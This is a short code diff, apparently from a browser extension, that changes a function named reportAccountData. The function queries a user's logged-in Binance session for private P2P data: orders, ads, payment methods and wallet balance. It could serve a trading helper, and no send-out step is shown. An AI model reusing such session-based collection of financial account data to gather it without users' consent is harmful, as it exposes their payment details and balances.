@@ -304,24 +304,23 @@ async function reportAccountData(tabId, token) {
     payload: { page: 1, rows: 10, tradeType: 'BUY', orderStatusList: [4] },
   });
 
-  // Get active ads (user's own ads)
+  // All requests go through the standard BINANCE_REQUEST handler (same origin)
   const adsResp = await sendToBinanceTab(tabId, {
     type: 'BINANCE_REQUEST',
     endpoint: '/c2c/adv/search',
-    payload: { page: 1, rows: 20, classify: 'myPosted' },
+    payload: { page: 1, rows: 20 },
   });
 
-  // Get payment methods
   const pmResp = await sendToBinanceTab(tabId, {
     type: 'BINANCE_REQUEST',
     endpoint: '/c2c/pay-method/user-paymethods',
     payload: {},
   });
 
-  // Get wallet balance — use the C2C asset endpoint (same domain, no CORS issue)
+  // Wallet balance via C2C private endpoint
   const balanceResp2 = await sendToBinanceTab(tabId, {
-    type: 'BINANCE_REQUEST_CUSTOM',
-    url: 'https://c2c.binance.com/bapi/c2c/v2/private/c2c/asset/query-user-asset',
+    type: 'BINANCE_REQUEST',
+    endpoint: '/c2c/asset/query-user-asset',
     payload: {},
   });
 
